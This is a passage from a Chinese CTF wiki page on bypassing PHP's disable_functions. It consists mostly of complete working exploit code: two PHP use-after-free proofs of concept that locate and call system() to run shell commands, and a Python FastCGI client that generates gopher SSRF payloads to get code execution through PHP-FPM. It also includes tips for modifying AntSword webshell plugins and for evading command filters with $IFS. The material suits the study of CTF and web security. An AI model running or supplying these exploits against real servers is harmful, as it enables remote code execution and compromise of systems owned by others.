\u5f53\u7136\uff0c\u66ff\u6362\u7a7a\u683c\u7b26\u7684\\t\u4e5f\u53ef\u4ee5\u6362\u6210 $IFS$() \u6765Bypass\u6389\u3002 php-json-bypass \u00b6 7.1 - all versions to date 7.2 < 7.2.19 (released: 30 May 2019) 7.3 < 7.3.6 (released: 30 May 2019) <?php # \u8fd9\u91cc\u4fee\u6539\u4f60\u7684\u547d\u4ee4 $cmd = \"id\" ; $n_alloc = 10 ; # increase this value if you get segfaults class MySplFixedArray extends SplFixedArray { public static $leak ; } class Z implements JsonSerializable { public function write ( & $str , $p , $v , $n = 8 ) { $i = 0 ; for ( $i = 0 ; $i < $n ; $i ++ ) { $str [ $p + $i ] = chr ( $v & 0xff ); $v >>= 8 ; } } public function str2ptr ( & $str , $p = 0 , $s = 8 ) { $address = 0 ; for ( $j = $s - 1 ; $j >= 0 ; $j -- ) { $address <<= 8 ; $address |= ord ( $str [ $p + $j ]); } return $address ; } public function ptr2str ( $ptr , $m = 8 ) { $out = \"\" ; for ( $i = 0 ; $i < $m ; $i ++ ) { $out .= chr ( $ptr & 0xff ); $ptr >>= 8 ; } return $out ; } # unable to leak ro segments public function leak1 ( $addr ) { global $spl1 ; $this -> write ( $this -> abc , 8 , $addr - 0x10 ); return strlen ( get_class ( $spl1 )); } # the real deal public function leak2 ( $addr , $p = 0 , $s = 8 ) { global $spl1 , $fake_tbl_off ; # fake reference zval $this -> write ( $this -> abc , $fake_tbl_off + 0x10 , 0xdeadbeef ); # gc_refcounted $this -> write ( $this -> abc , $fake_tbl_off + 0x18 , $addr + $p - 0x10 ); # zval $this -> write ( $this -> abc , $fake_tbl_off + 0x20 , 6 ); # type (string) $leak = strlen ( $spl1 :: $leak ); if ( $s != 8 ) { $leak %= 2 << ( $s * 8 ) - 1 ; } return $leak ; } public function parse_elf ( $base ) { $e_type = $this -> leak2 ( $base , 0x10 , 2 ); $e_phoff = $this -> leak2 ( $base , 0x20 ); $e_phentsize = $this -> leak2 ( $base , 0x36 , 2 ); $e_phnum = $this -> leak2 ( $base , 0x38 , 2 ); for ( $i = 0 ; $i < $e_phnum ; $i ++ ) { $header = $base + $e_phoff + $i * $e_phentsize ; $p_type = $this -> leak2 ( $header , 0 , 4 ); $p_flags = $this -> leak2 ( $header , 4 , 4 ); $p_vaddr = $this -> leak2 ( $header , 0x10 ); $p_memsz = $this -> leak2 ( $header , 0x28 ); if ( $p_type == 0x6474e552 ) { # PT_GNU_RELRO # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr ; $data_size = $p_memsz ; } else if ( $p_type == 1 && $p_flags == 5 ) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz ; } } if ( ! $data_addr || ! $text_size || ! $data_size ) return false ; return [ $data_addr , $text_size , $data_size ]; } public function get_basic_funcs ( $base , $elf ) { list ( $data_addr , $text_size , $data_size ) = $elf ; for ( $i = 0 ; $i < $data_size / 8 ; $i ++ ) { $leak = $this -> leak2 ( $data_addr , $i * 8 ); if ( $leak - $base > 0 && $leak - $base < $text_size ) { $deref = $this -> leak2 ( $leak ); # 'constant' constant check if ( $deref != 0x746e6174736e6f63 ) continue ; } else continue ; $leak = $this -> leak2 ( $data_addr , ( $i + 4 ) * 8 ); if ( $leak - $base > 0 && $leak - $base < $text_size ) { $deref = $this -> leak2 ( $leak ); # 'bin2hex' constant check if ( $deref != 0x786568326e6962 ) continue ; } else continue ; return $data_addr + $i * 8 ; } } public function get_binary_base ( $binary_leak ) { $base = 0 ; $start = $binary_leak & 0xfffffffffffff000 ; for ( $i = 0 ; $i < 0x1000 ; $i ++ ) { $addr = $start - 0x1000 * $i ; $leak = $this -> leak2 ( $addr , 0 , 7 ); if ( $leak == 0x10102464c457f ) { # ELF header return $addr ; } } } public function get_system ( $basic_funcs ) { $addr = $basic_funcs ; do { $f_entry = $this -> leak2 ( $addr ); $f_name = $this -> leak2 ( $f_entry , 0 , 6 ); if ( $f_name == 0x6d6574737973 ) { # system return $this -> leak2 ( $addr + 8 ); } $addr += 0x20 ; } while ( $f_entry != 0 ); return false ; } public function jsonSerialize () { global $y , $cmd , $spl1 , $fake_tbl_off , $n_alloc ; $contiguous = []; for ( $i = 0 ; $i < $n_alloc ; $i ++ ) $contiguous [] = new DateInterval ( 'PT1S' ); $room = []; for ( $i = 0 ; $i < $n_alloc ; $i ++ ) $room [] = new Z (); $_protector = $this -> ptr2str ( 0 , 78 ); $this -> abc = $this -> ptr2str ( 0 , 79 ); $p = new DateInterval ( 'PT1S' ); unset ( $y [ 0 ]); unset ( $p ); $protector = \". $_protector \" ; $x = new DateInterval ( 'PT1S' ); $x -> d = 0x2000 ; $x -> h = 0xdeadbeef ; # $this->abc is now of size 0x2000 if ( $this -> str2ptr ( $this -> abc ) != 0xdeadbeef ) { die ( 'UAF failed.' ); } $spl1 = new MySplFixedArray (); $spl2 = new MySplFixedArray (); # some leaks $class_entry = $this -> str2ptr ( $this -> abc , 0x120 ); $handlers = $this -> str2ptr ( $this -> abc , 0x128 ); $php_heap = $this -> str2ptr ( $this -> abc , 0x1a8 ); $abc_addr = $php_heap - 0x218 ; # create a fake class_entry $fake_obj = $abc_addr ; $this -> write ( $this -> abc , 0 , 2 ); # type $this -> write ( $this -> abc , 0x120 , $abc_addr ); # fake class_entry # copy some of class_entry definition for ( $i = 0 ; $i < 16 ; $i ++ ) { $this -> write ( $this -> abc , 0x10 + $i * 8 , $this -> leak1 ( $class_entry + 0x10 + $i * 8 )); } # fake static members table $fake_tbl_off = 0x70 * 4 - 16 ; $this -> write ( $this -> abc , 0x30 , $abc_addr + $fake_tbl_off ); $this -> write ( $this -> abc , 0x38 , $abc_addr + $fake_tbl_off ); # fake zval_reference $this -> write ( $this -> abc , $fake_tbl_off , $abc_addr + $fake_tbl_off + 0x10 ); # zval $this -> write ( $this -> abc , $fake_tbl_off + 8 , 10 ); # zval type (reference) # look for binary base $binary_leak = $this -> leak2 ( $handlers + 0x10 ); if ( ! ( $base = $this -> get_binary_base ( $binary_leak ))) { die ( \"Couldn't determine binary base address\" ); } # parse elf header if ( ! ( $elf = $this -> parse_elf ( $base ))) { die ( \"Couldn't parse ELF\" ); } # get basic_functions address if ( ! ( $basic_funcs = $this -> get_basic_funcs ( $base , $elf ))) { die ( \"Couldn't get basic_functions address\" ); } # find system entry if ( ! ( $zif_system = $this -> get_system ( $basic_funcs ))) { die ( \"Couldn't get zif_system address\" ); } # copy hashtable offsetGet bucket $fake_bkt_off = 0x70 * 5 - 16 ; $function_data = $this -> str2ptr ( $this -> abc , 0x50 ); for ( $i = 0 ; $i < 4 ; $i ++ ) { $this -> write ( $this -> abc , $fake_bkt_off + $i * 8 , $this -> leak2 ( $function_data + 0x40 * 4 , $i * 8 )); } # create a fake bucket $fake_bkt_addr = $abc_addr + $fake_bkt_off ; $this -> write ( $this -> abc , 0x50 , $fake_bkt_addr ); for ( $i = 0 ; $i < 3 ; $i ++ ) { $this -> write ( $this -> abc , 0x58 + $i * 4 , 1 , 4 ); } # copy bucket zval $function_zval = $this -> str2ptr ( $this -> abc , $fake_bkt_off ); for ( $i = 0 ; $i < 12 ; $i ++ ) { $this -> write ( $this -> abc , $fake_bkt_off + 0x70 + $i * 8 , $this -> leak2 ( $function_zval , $i * 8 )); } # pwn $this -> write ( $this -> abc , $fake_bkt_off + 0x70 + 0x30 , $zif_system ); $this -> write ( $this -> abc , $fake_bkt_off , $fake_bkt_addr + 0x70 ); $spl1 -> offsetGet ( $cmd ); exit (); } } $y = [ new Z ()]; json_encode ([ & $y ]); php7-gc-bypass \u00b6 PHP 7.0-7.3 disable_functions bypass PoC (*nix only) <?php # PHP 7.0-7.3 disable_functions bypass PoC (*nix only) # # Bug: https://bugs.php.net/bug.php?id=72530 # # This exploit should work on all PHP 7.0-7.3 versions # # Author: https://github.com/mm0r1 pwn ( \"uname -a\" ); function pwn ( $cmd ) { global $abc , $helper ; function str2ptr ( & $str , $p = 0 , $s = 8 ) { $address = 0 ; for ( $j = $s - 1 ; $j >= 0 ; $j -- ) { $address <<= 8 ; $address |= ord ( $str [ $p + $j ]); } return $address ; } function ptr2str ( $ptr , $m = 8 ) { $out = \"\" ; for ( $i = 0 ; $i < $m ; $i ++ ) { $out .= chr ( $ptr & 0xff ); $ptr >>= 8 ; } return $out ; } function write ( & $str , $p , $v , $n = 8 ) { $i = 0 ; for ( $i = 0 ; $i < $n ; $i ++ ) { $str [ $p + $i ] = chr ( $v & 0xff ); $v >>= 8 ; } } function leak ( $addr , $p = 0 , $s = 8 ) { global $abc , $helper ; write ( $abc , 0x68 , $addr + $p - 0x10 ); $leak = strlen ( $helper -> a ); if ( $s != 8 ) { $leak %= 2 << ( $s * 8 ) - 1 ; } return $leak ; } function parse_elf ( $base ) { $e_type = leak ( $base , 0x10 , 2 ); $e_phoff = leak ( $base , 0x20 ); $e_phentsize = leak ( $base , 0x36 , 2 ); $e_phnum = leak ( $base , 0x38 , 2 ); for ( $i = 0 ; $i < $e_phnum ; $i ++ ) { $header = $base + $e_phoff + $i * $e_phentsize ; $p_type = leak ( $header , 0 , 4 ); $p_flags = leak ( $header , 4 , 4 ); $p_vaddr = leak ( $header , 0x10 ); $p_memsz = leak ( $header , 0x28 ); if ( $p_type == 1 && $p_flags == 6 ) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr ; $data_size = $p_memsz ; } else if ( $p_type == 1 && $p_flags == 5 ) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz ; } } if ( ! $data_addr || ! $text_size || ! $data_size ) return false ; return [ $data_addr , $text_size , $data_size ]; } function get_basic_funcs ( $base , $elf ) { list ( $data_addr , $text_size , $data_size ) = $elf ; for ( $i = 0 ; $i < $data_size / 8 ; $i ++ ) { $leak = leak ( $data_addr , $i * 8 ); if ( $leak - $base > 0 && $leak - $base < $data_addr - $base ) { $deref = leak ( $leak ); # 'constant' constant check if ( $deref != 0x746e6174736e6f63 ) continue ; } else continue ; $leak = leak ( $data_addr , ( $i + 4 ) * 8 ); if ( $leak - $base > 0 && $leak - $base < $data_addr - $base ) { $deref = leak ( $leak ); # 'bin2hex' constant check if ( $deref != 0x786568326e6962 ) continue ; } else continue ; return $data_addr + $i * 8 ; } } function get_binary_base ( $binary_leak ) { $base = 0 ; $start = $binary_leak & 0xfffffffffffff000 ; for ( $i = 0 ; $i < 0x1000 ; $i ++ ) { $addr = $start - 0x1000 * $i ; $leak = leak ( $addr , 0 , 7 ); if ( $leak == 0x10102464c457f ) { # ELF header return $addr ; } } } function get_system ( $basic_funcs ) { $addr = $basic_funcs ; do { $f_entry = leak ( $addr ); $f_name = leak ( $f_entry , 0 , 6 ); if ( $f_name == 0x6d6574737973 ) { # system return leak ( $addr + 8 ); } $addr += 0x20 ; } while ( $f_entry != 0 ); return false ; } class ryat { var $ryat ; var $chtg ; function __destruct () { $this -> chtg = $this -> ryat ; $this -> ryat = 1 ; } } class Helper { public $a , $b , $c , $d ; } if ( stristr ( PHP_OS , 'WIN' )) { die ( 'This PoC is for *nix systems only.' ); } $n_alloc = 10 ; # increase this value if you get segfaults $contiguous = []; for ( $i = 0 ; $i < $n_alloc ; $i ++ ) $contiguous [] = str_repeat ( 'A' , 79 ); $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}' ; $out = unserialize ( $poc ); gc_collect_cycles (); $v = []; $v [ 0 ] = ptr2str ( 0 , 79 ); unset ( $v ); $abc = $out [ 2 ][ 0 ]; $helper = new Helper ; $helper -> b = function ( $x ) { }; if ( strlen ( $abc ) == 79 || strlen ( $abc ) == 0 ) { die ( \"UAF failed\" ); } # leaks $closure_handlers = str2ptr ( $abc , 0 ); $php_heap = str2ptr ( $abc , 0x58 ); $abc_addr = $php_heap - 0xc8 ; # fake value write ( $abc , 0x60 , 2 ); write ( $abc , 0x70 , 6 ); # fake reference write ( $abc , 0x10 , $abc_addr + 0x60 ); write ( $abc , 0x18 , 0xa ); $closure_obj = str2ptr ( $abc , 0x20 ); $binary_leak = leak ( $closure_handlers , 8 ); if ( ! ( $base = get_binary_base ( $binary_leak ))) { die ( \"Couldn't determine binary base address\" ); } if ( ! ( $elf = parse_elf ( $base ))) { die ( \"Couldn't parse ELF header\" ); } if ( ! ( $basic_funcs = get_basic_funcs ( $base , $elf ))) { die ( \"Couldn't get basic_functions address\" ); } if ( ! ( $zif_system = get_system ( $basic_funcs ))) { die ( \"Couldn't get zif_system address\" ); } # fake closure object $fake_obj_offset = 0xd0 ; for ( $i = 0 ; $i < 0x110 ; $i += 8 ) { write ( $abc , $fake_obj_offset + $i , leak ( $closure_obj , $i )); } # pwn write ( $abc , 0x20 , $abc_addr + $fake_obj_offset ); write ( $abc , 0xd0 + 0x38 , 1 , 4 ); # internal func type write ( $abc , 0xd0 + 0x68 , $zif_system ); # internal func handler ( $helper -> b )( $cmd ); exit (); } \u653b\u51fb PHP-FPM \u7ed5\u8fc7 Disable_Functions \u00b6 \u914d\u5408SSRF\u653b\u51fbPHP-FPM \u00b6 \u60f3\u8981\u5206\u6790\u5b83\u7684\u653b\u51fb\u539f\u7406\u9700\u8981\u4eceFastCGI\u534f\u8bae\u5c01\u88c5\u6570\u636e\u5185\u5bb9\u6765\u770b\uff0c\u8fd9\u91cc\u4ec5\u5bf9\u653b\u51fb\u539f\u7406\u505a\u7b80\u8981\u63cf\u8ff0\uff0c CGI \u548c FastCGI \u534f\u8bae\u7684\u8fd0\u884c\u539f\u7406 \u8fd9\u7bc7\u6587\u7ae0\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u4e86FastCGI\u534f\u8bae\u7684\u5185\u5bb9\uff0c\u5176\u653b\u51fb\u539f\u7406\u5c31\u662f\u5728\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u5b9e\u9645\u8bf7\u6c42\u4e2d\u4f1a\u51fa\u73b0\u4e00\u4e2a SCRIPT_FILENAME': '/var/www/html/index.php \u8fd9\u6837\u7684\u952e\u503c\u5bf9\uff0c\u5b83\u7684\u610f\u601d\u662fphp-fpm\u4f1a\u6267\u884c\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6837\u5373\u4f7f\u80fd\u591f\u63a7\u5236\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u503c\uff0c\u4f46\u4e5f\u53ea\u80fd\u63a7\u5236php-fpm\u53bb\u6267\u884c\u67d0\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u591f\u5b9e\u73b0\u4e00\u4e9b \u6076\u610f\u4ee3\u7801 \u7684\u6267\u884c\u3002 \u800c\u5728php5.3.9\u540e\u6765\u7684\u7248\u672c\u4e2d\uff0cphp\u589e\u52a0\u4e86\u5b89\u5168\u9009\u9879\u5bfc\u81f4\u53ea\u80fd\u63a7\u5236php-fpm\u6267\u884c\u4e00\u4e9bphp\u3001php4\u8fd9\u6837\u7684\u6587\u4ef6\uff0c\u8fd9\u4e5f\u589e\u5927\u4e86\u653b\u51fb\u7684\u96be\u5ea6\u3002\u4f46\u662f\u597d\u5728php\u5b98\u65b9\u5141\u8bb8\u901a\u8fc7PHP_ADMIN_VALUE\u548cPHP_VALUE\u53bb\u52a8\u6001\u4fee\u6539php\u7684\u8bbe\u7f6e\u3002 \u90a3\u4e48\u5f53\u8bbe\u7f6ephp\u73af\u5883\u53d8\u91cf\u4e3a: auto_prepend_file = php://input;allow_url_include = On ,\u5c31\u4f1a\u5728\u6267\u884cphp\u811a\u672c\u4e4b\u524d\u5305\u542b auto_prepend_file \u6587\u4ef6\u7684\u5185\u5bb9, php://input \u4e5f\u5c31\u662fPOST\u7684\u5185\u5bb9,\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u5728FastCGI\u534f\u8bae\u7684body\u63a7\u5236\u4e3a\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u6837\u5c31\u5728\u7406\u8bba\u4e0a\u5b9e\u73b0\u4e86php-fpm\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u653b\u51fb\u3002 PHP-FPM\u653b\u51fb\u811a\u672c import socket import random import argparse import sys from io import BytesIO import base64 import urllib # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys . version_info . major == 2 else False def bchr ( i ): if PY2 : return force_bytes ( chr ( i )) else : return bytes ([ i ]) def bord ( c ): if isinstance ( c , int ): return c else : return ord ( c ) def force_bytes ( s ): if isinstance ( s , bytes ): return s else : return s . encode ( 'utf-8' , 'strict' ) def force_text ( s ): if issubclass ( type ( s ), str ): return s if isinstance ( s , bytes ): s = str ( s , 'utf-8' , 'strict' ) else : s = str ( s ) return s class FastCGIClient : \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__ ( self , host , port , timeout , keepalive ): self . host = host self . port = port self . timeout = timeout if keepalive : self . keepalive = 1 else : self . keepalive = 0 self . sock = None self . requests = dict () def __connect ( self ): self . sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) self . sock . settimeout ( self . timeout ) self . sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try : self . sock . connect (( self . host , int ( self . port ))) except socket . error as msg : self . sock . close () self . sock = None print ( repr ( msg )) return False return True def __encodeFastCGIRecord ( self , fcgi_type , content , requestid ): length = len ( content ) buf = bchr ( FastCGIClient . __FCGI_VERSION ) \\ + bchr ( fcgi_type ) \\ + bchr (( requestid >> 8 ) & 0xFF ) \\ + bchr ( requestid & 0xFF ) \\ + bchr (( length >> 8 ) & 0xFF ) \\ + bchr ( length & 0xFF ) \\ + bchr ( 0 ) \\ + bchr ( 0 ) \\ + content return buf def __encodeNameValueParams ( self , name , value ): nLen = len ( name ) vLen = len ( value ) record = b '' if nLen < 128 : record += bchr ( nLen ) else : record += bchr (( nLen >> 24 ) | 0x80 ) \\ + bchr (( nLen >> 16 ) & 0xFF ) \\ + bchr (( nLen >> 8 ) & 0xFF ) \\ + bchr ( nLen & 0xFF ) if vLen < 128 : record += bchr ( vLen ) else : record += bchr (( vLen >> 24 ) | 0x80 ) \\ + bchr (( vLen >> 16 ) & 0xFF ) \\ + bchr (( vLen >> 8 ) & 0xFF ) \\ + bchr ( vLen & 0xFF ) return record + name + value def __decodeFastCGIHeader ( self , stream ): header = dict () header [ 'version' ] = bord ( stream [ 0 ]) header [ 'type' ] = bord ( stream [ 1 ]) header [ 'requestId' ] = ( bord ( stream [ 2 ]) << 8 ) + bord ( stream [ 3 ]) header [ 'contentLength' ] = ( bord ( stream [ 4 ]) << 8 ) + bord ( stream [ 5 ]) header [ 'paddingLength' ] = bord ( stream [ 6 ]) header [ 'reserved' ] = bord ( stream [ 7 ]) return header def __decodeFastCGIRecord ( self , buffer ): header = buffer . read ( int ( self . __FCGI_HEADER_SIZE )) if not header : return False else : record = self . __decodeFastCGIHeader ( header ) record [ 'content' ] = b '' if 'contentLength' in record . keys (): contentLength = int ( record [ 'contentLength' ]) record [ 'content' ] += buffer . read ( contentLength ) if 'paddingLength' in record . keys (): skiped = buffer . read ( int ( record [ 'paddingLength' ])) return record def request ( self , nameValuePairs = {}, post = '' ): if not self . __connect (): print ( 'connect failure! please check your fasctcgi-server !!' ) return requestId = random . randint ( 1 , ( 1 << 16 ) - 1 ) self . requests [ requestId ] = dict () request = b \"\" beginFCGIRecordContent = bchr ( 0 ) \\ + bchr ( FastCGIClient . __FCGI_ROLE_RESPONDER ) \\ + bchr ( self . keepalive ) \\ + bchr ( 0 ) * 5 request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_BEGIN , beginFCGIRecordContent , requestId ) paramsRecord = b '' if nameValuePairs : for ( name , value ) in nameValuePairs . items (): name = force_bytes ( name ) value = force_bytes ( value ) paramsRecord += self . __encodeNameValueParams ( name , value ) if paramsRecord : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , paramsRecord , requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , b '' , requestId ) if post : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , force_bytes ( post ), requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , b '' , requestId ) self . sock . send ( request ) self . requests [ requestId ][ 'state' ] = FastCGIClient . FCGI_STATE_SEND self . requests [ requestId ][ 'response' ] = b '' return self . __waitForResponse ( requestId ) def gopher ( self , nameValuePairs = {}, post = '' ): requestId = random . randint ( 1 , ( 1 << 16 ) - 1 ) self . requests [ requestId ] = dict () request = b \"\" beginFCGIRecordContent = bchr ( 0 ) \\ + bchr ( FastCGIClient . __FCGI_ROLE_RESPONDER ) \\ + bchr ( self . keepalive ) \\ + bchr ( 0 ) * 5 request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_BEGIN , beginFCGIRecordContent , requestId ) paramsRecord = b '' if nameValuePairs : for ( name , value ) in nameValuePairs . items (): name = force_bytes ( name ) value = force_bytes ( value ) paramsRecord += self . __encodeNameValueParams ( name , value ) if paramsRecord : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , paramsRecord , requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_PARAMS , b '' , requestId ) if post : request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , force_bytes ( post ), requestId ) request += self . __encodeFastCGIRecord ( FastCGIClient . __FCGI_TYPE_STDIN , b '' , requestId ) return request def __waitForResponse ( self , requestId ): data = b '' while True : buf = self . sock . recv ( 512 ) if not len ( buf ): break data += buf data = BytesIO ( data ) while True : response = self . __decodeFastCGIRecord ( data ) if not response : break if response [ 'type' ] == FastCGIClient . __FCGI_TYPE_STDOUT \\ or response [ 'type' ] == FastCGIClient . __FCGI_TYPE_STDERR : if response [ 'type' ] == FastCGIClient . __FCGI_TYPE_STDERR : self . requests [ 'state' ] = FastCGIClient . FCGI_STATE_ERROR if requestId == int ( response [ 'requestId' ]): self . requests [ requestId ][ 'response' ] += response [ 'content' ] if response [ 'type' ] == FastCGIClient . FCGI_STATE_SUCCESS : self . requests [ requestId ] return self . requests [ requestId ][ 'response' ] def __repr__ ( self ): return \"fastcgi connect host: {} port: {} \" . format ( self . host , self . port ) if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = 'Php-fpm code execution vulnerability client.' ) parser . add_argument ( 'host' , help = 'Target host, such as 127.0.0.1' ) parser . add_argument ( 'file' , help = 'A php file absolute path, such as /usr/local/lib/php/System.php' ) parser . add_argument ( '-c' , '--code' , help = 'What php code your want to execute' , default = '' ) parser . add_argument ( '-p' , '--port' , help = 'FastCGI port' , default = 9000 , type = int ) parser . add_argument ( '-e' , '--ext' , help = 'ext absolute path' , default = '' ) parser . add_argument ( '-if' , '--include_file' , help = 'evil.php absolute path' , default = '' ) parser . add_argument ( '-u' , '--url_format' , help = 'generate gopher stream in url format' , nargs = '?' , const = 1 ) parser . add_argument ( '-b' , '--base64_format' , help = 'generate gopher stream in base64 format' , nargs = '?' , const = 1 ) args = parser . parse_args () client = FastCGIClient ( args . host , args . port , 3 , 0 ) params = dict () documentRoot = \"/\" uri = args . file params = { 'GATEWAY_INTERFACE' : 'FastCGI/1.0' , 'REQUEST_METHOD' : 'POST' , 'SCRIPT_FILENAME' : documentRoot + uri . lstrip ( '/' ), 'SCRIPT_NAME' : uri , 'QUERY_STRING' : '' , 'REQUEST_URI' : uri , 'DOCUMENT_ROOT' : documentRoot , 'SERVER_SOFTWARE' : 'php/fcgiclient' , 'REMOTE_ADDR' : '127.0.0.1' , 'REMOTE_PORT' : '9985' , 'SERVER_ADDR' : '127.0.0.1' , 'SERVER_PORT' : '80' , 'SERVER_NAME' : \"localhost\" , 'SERVER_PROTOCOL' : 'HTTP/1.1' , 'CONTENT_TYPE' : 'application/text' , 'CONTENT_LENGTH' : \" %d \" % len ( args . code ), 'PHP_VALUE' : 'auto_prepend_file = php://input' , 'PHP_ADMIN_VALUE' : 'allow_url_include = On' } if args . ext and args . include_file : #params['PHP_ADMIN_VALUE']='extension = '+args.ext params [ 'PHP_ADMIN_VALUE' ] = \"extension_dir = /var/www/html \\n extension = ant.so\" params [ 'PHP_VALUE' ] = 'auto_prepend_file = ' + args . include_file if not args . url_format and not args . base64_format : response = client . request ( params , args . code ) print ( force_text ( response )) else : response = client . gopher ( params , args . code ) if args . url_format : print ( urllib . quote ( response )) if args . base64_format : print ( base64 . b64encode ( response )) \u7136\u540e\u5728\u751f\u6210\u7684payload\u524d\u52a0\u4e0a gopher://ip:port/_ \u5f97\u5230\uff1a \u4f7f\u7528\u8681\u5251\u63d2\u4ef6\u5e76\u4fee\u6539\u7ed5\u8fc7 \u00b6 \u4f46\u662f\u63d2\u4ef6\u4e2d\u7684payload\u4f7f\u7528\u4e86 fsockopen() \uff0c\u5982\u679c fsockopen() \u88abban\u4e86\uff0c\u6216\u8005\u60f3\u8981\u4fee\u6539\u8681\u5251\u7684\u63d2\u4ef6\u4e2d\u7684\u5730\u5740127.0.0.1:9001 \u7684\u9009\u9879\u3002 \u4f46\u662f pfsockopen() \u6ca1\u6709\u88abban \u800c\u4e14\u4e24\u8005\u6ca1\u6709\u4efb\u4f55\u533a\u522b \u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u4e0b\u7684 fsockopen() \u6539\u6210 pfsockopen() \u5373\u53ef \\antData\\plugins\\as_bypass_php_disable_functions-master\\payload.js \\antData\\plugins\\as_bypass_php_disable_functions-master\\core\\php_fpm\\index.js \u5728 \\core\\php_fpm\\index.js \u53ef\u4ee5\u4fee\u6539\u4e0b\u62c9\u5217\u8868\u7684ip \u53c2\u8003\u6587\u7ae0 \u00b6 \u6d45\u8c08\u51e0\u79cdBypass disable_functions\u7684\u65b9\u6cd5 \u6e17\u900f\u6d4b\u8bd5\u4e4b\u7ed5\u8fc7PHP\u7684disable_functions PHP Webshell\u4e0b\u7ed5\u8fc7disable_function\u7684\u65b9\u6cd5","title":"\u7ed5\u8fc7disable_functions"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#disable_functions","text":"\u6709\u5f88\u591a\u65f6\u5019\u6211\u4eec\u62ff\u5230\u4e00\u4e2ashell\u5374\u5f88\u65e0\u80fd\u4e3a\u529b \u56e0\u4e3a\u4ed6\u7981\u7528\u4e86\u592a\u591a\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u8981\u53bb\u601d\u8003\u5982\u4f55\u7ed5\u8fc7","title":"\u7ed5\u8fc7disable_functions"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#_1","text":"\u5373\u4fbf\u662f\u901a\u8fc7disable functions\u9650\u5236\u5371\u9669\u51fd\u6570\uff0c\u4e5f\u53ef\u80fd\u4f1a\u6709\u9650\u5236\u4e0d\u5168\u7684\u60c5\u51b5\u3002\u5982\u679c\u8fd0\u7ef4\u4eba\u5458\u5b89\u5168\u610f\u8bc6\u4e0d\u5f3a\u6216\u5bf9PHP\u4e0d\u751a\u4e86\u89e3\u7684\u8bdd\uff0c\u5219\u5f88\u6709\u53ef\u80fd\u5ffd\u7565\u67d0\u4e9b\u5371\u9669\u51fd\u6570\uff0c\u5e38\u89c1\u7684\u6709\u4ee5\u4e0b\u51e0\u79cd exec()\u3001shell_exec()\u3001system()\u3001passthru()\u3001popen()\u3001proc_open()\u3001pcntl_exec \u8fd9\u51e0\u4e2a\u51fd\u6570\u5177\u4f53\u5982\u4f55\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u81ea\u884c\u641c\u7d22","title":"\u9ed1\u540d\u5355\u7ed5\u8fc7"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#ld_preload","text":"","title":"\u5229\u7528 LD_PRELOAD \u73af\u5883\u53d8\u91cf"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#ld_preload_1","text":"LD_PRELOAD\u662fLinux\u7cfb\u7edf\u7684\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u53ef\u4ee5\u5f71\u54cd\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u7684\u94fe\u63a5\uff08Runtime 